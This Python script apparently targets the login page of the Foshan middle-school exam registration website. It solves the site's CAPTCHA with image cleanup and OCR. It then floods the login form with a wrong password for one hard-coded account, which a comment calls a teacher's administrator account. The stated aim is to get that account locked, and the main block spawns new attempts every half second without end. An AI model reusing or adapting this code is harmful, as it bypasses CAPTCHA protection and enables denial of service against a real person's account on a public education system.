'''
Author: whalefall
Date: 2021-03-20 16:37:34
LastEditTime: 2021-04-04 12:06:40
Description: 中考报名网站 老李独享板
'''
import base64
# 懒得研究/复写他的加密算法 直接用execjs模拟
import configparser
import datetime
import os
import random
import re
import sys
import threading
import time
import traceback
from ast import literal_eval  # 字符串列表转列表
from concurrent.futures import ThreadPoolExecutor
from io import BytesIO

# 验证码
import pytesseract
import requests
from lxml import etree
from PIL import Image

# 加密 效率问题
# from zkEdu import Encrypt


class Zkweb:

    # 初始化各种属性
    def __init__(self):
        self.header = {
            "User-Agent":
            "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 MicroMessenger/6.7.3(0x16070321) NetType/WIFI Language/zh_CN",
            "Accept":
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            # Cookie: SESSION=a02ab646-9f8a-4755-9abb-f722d6fb1676; name=value; JSESSIONID=value,
            "Host": "exam.edu.foshan.gov.cn",
            "Pragma": "no-cache",
            "Referer": "https://exam.edu.foshan.gov.cn/iexamfs/",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
        }
        self.sessions = requests.session()  # 带cookies的请求

        self.code = None  # 验证码内容
        # self.index_url = None
        self.count = 0  # 失败计数

    # 获取验证码地址
    def getCode(self):
        url = "https://exam.edu.foshan.gov.cn/iexamfs/LoginAction.action"
        try:
            resp = self.sessions.get(url, headers=self.header)
            # print(resp.text)
            html = etree.HTML(resp.text)
            code = html.xpath(
                "/html/body/form/table/tr/td/table/tr[4]/td/table/tr/td/table/tr[3]/td[2]/img/@src"
            )[0]
            code_url = "https://exam.edu.foshan.gov.cn/iexamfs/" + code
            # print("验证码地址:", code_url)
            return code_url
        except Exception as e:

            print("页面验证码获取失败 原因:", e)

            try:
                if "系统例行维护" in resp.text:
                    print("中考报名系统晚上22:30至次日08:30暂停服务!")
                    sys.exit()
            except Exception as er:
                print("错误信息:%s" % (er))
                time.sleep(5)

            return None

        finally:
            resp.close()

    # 下载验证码 返回二进制信息
    def downloadCode(self):
        code_url = self.getCode()
        if code_url == None:
            pass
        else:
            try:
                resp = self.sessions.get(code_url, headers=self.header)

                # 验证码内容
                self.code = resp.content

                return True
            except Exception as e:
                print("下载验证码失败! URL:%s" % (code_url))
                return False
            finally:
                resp.close()
        # 验证码识别部分

    def checkCode(self):
        if self.downloadCode():
            image = self.dispose_code()  # 效果最好的方案
            code = pytesseract.image_to_string(image)
            # 去掉非法字符，只保留字母数字
            textCode = re.sub("\W", "", code)
            # print("识别到的验证码:", textCode)

            # 验证码为空 重试
            if textCode == "":
                return False

            return textCode

        else:
            return False

    # 美化验证码3 个人感觉效果最好的方案了
    def dispose_code(self):
        img = Image.open(BytesIO(self.code))

        def binarizing(img, threshold):
            """传入image对象进行灰度、二值处理"""
            img = img.convert("L")  # 转灰度
            pixdata = img.load()
            w, h = img.size
            # 遍历所有像素，大于阈值的为黑色
            for y in range(h):
                for x in range(w):
                    if pixdata[x, y] < threshold:
                        pixdata[x, y] = 0
                    else:
                        pixdata[x, y] = 255
            return img

        img = binarizing(img, 225)
        """传入二值化后的图片进行降噪"""
        pixdata = img.load()
        w, h = img.size
        for y in range(1, h - 1):
            for x in range(1, w - 1):
                count = 0
                if pixdata[x, y - 1] > 245:  # 上
                    count = count + 1
                if pixdata[x, y + 1] > 245:  # 下
                    count = count + 1
                if pixdata[x - 1, y] > 245:  # 左
                    count = count + 1
                if pixdata[x + 1, y] > 245:  # 右
                    count = count + 1
                if pixdata[x - 1, y - 1] > 245:  # 左上
                    count = count + 1
                if pixdata[x - 1, y + 1] > 245:  # 左下
                    count = count + 1
                if pixdata[x + 1, y - 1] > 245:  # 右上
                    count = count + 1
                if pixdata[x + 1, y + 1] > 245:  # 右下
                    count = count + 1
                if count > 4:
                    pixdata[x, y] = 255
        # img.show()
        return img

    # 登录部分 并获取主页
    def login(self, code, userid, pwd):
        url = "https://exam.edu.foshan.gov.cn/iexamfs/LoginExtMenuAction.action"
        # 弃用 nodejs 加密 优化速度
        # 老李账号加密后:
        # bzr0605150806 --> r86mK3B29cysHqWSZFymJA==
        # 随便的密码
        data = {
            "login.logintype": "basis_member",
            "userid": "r86mK3B29cysHqWSZFymJA==",
            # "userid": Encrypt().userid(userid),
            "password": "3b819dbfc14bd950dc14d0f9275e55c9",
            "rand": code,
        }
        try:
            resp = self.sessions.post(url, data=data, headers=self.header)
        except:
            print("请求登录接口错误?")
            return "apiError"
        finally:
            resp.close()

        # 登录时的错误
        # print(resp.text)
        if "输入的验证码错误" in resp.text:
            print("验证码识别有误:%s" % (code))
            return False

        # 可能账号密码不存在之类的
        elif "[规则]登录失败！" in resp.text:
            print("%s登录受限!" % (userid))
            self.count += 1
            if self.count >= 10:
                print("账户(%s)可能被限制超过10次 请换ip" % (userid))
                return "resqError"
            return False

        elif "登录失败，请核对您的用户名和密码！" in resp.text:
            print("账号(%s)密码(%s)有误!" % (userid, pwd))
            return "PwdError"

        elif "账号已被锁定，请在5分钟后进行尝试。" in resp.text:
            print("[Suc]账号(%s)已传入数据库!" % (userid))
            return "Locking"

        else:
            pass


def main(userid, pwd=None, _status=0):
    # 在循环外实例化对象 保留count计数器
    bot = Zkweb()
    if pwd != None:
        _status = 1
    try:
        i = 0  # 单用户请求次数计数
        while True:
            i += 1
            if _status != 1:
                pass
            else:
                pass

            print("----------------%s第%s次请求----------------" % (userid, i))
            code = bot.checkCode()
            # 验证码识别有误时 跳出本次循环 减少对登录接口的请求次数

            if code == False:
                print("验证码识别(登陆前)错误!")
                continue

            loginStatus = bot.login(code, userid, pwd)
            if loginStatus == "Error":
                # print("发生未知错误 已下载错误页面!")
                break
            elif loginStatus == "Locking":
                t = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                print('''
                ################################
                #    Time:%s
                #    User:%s 成功将其传入主数据库!
                ################################
                ''' % (t, userid))
                # writeMsq(int(userid), str(t))

                return "Suc"

            elif loginStatus == "apiError":
                print("接口错误!")
                # time.sleep(10)
                break

            # 密码错误 --继续运行下去,并删除失败的密码
            elif loginStatus == "PwdError":

                if _status == 1:
                    print("给定密码错误!")
                    break
                else:
                    # PwdList.remove(pwd)
                    continue
            # 规则[登录失败!]
            elif loginStatus == "resqError":
                # print("")
                break

            elif loginStatus == "error":
                # print("")
                break

            elif loginStatus:
                bot.index()
                break

            else:
                pass
                # time.sleep(2)
    except Exception as e:
        print('''
##############出现错误############
# 用户ID:%s
# 错误信息:
# %s
##################################
        ''' % (userid, traceback.format_exc()))


# 老李的管理员账号
# main("bzr0605150806")

if __name__ == "__main__":

    # 多进程部分
    import multiprocessing
    pool = multiprocessing.Pool(processes=5)

    while True:

        pool.apply_async(func=main, args=("bzr0605150806", ))
        time.sleep(0.5)
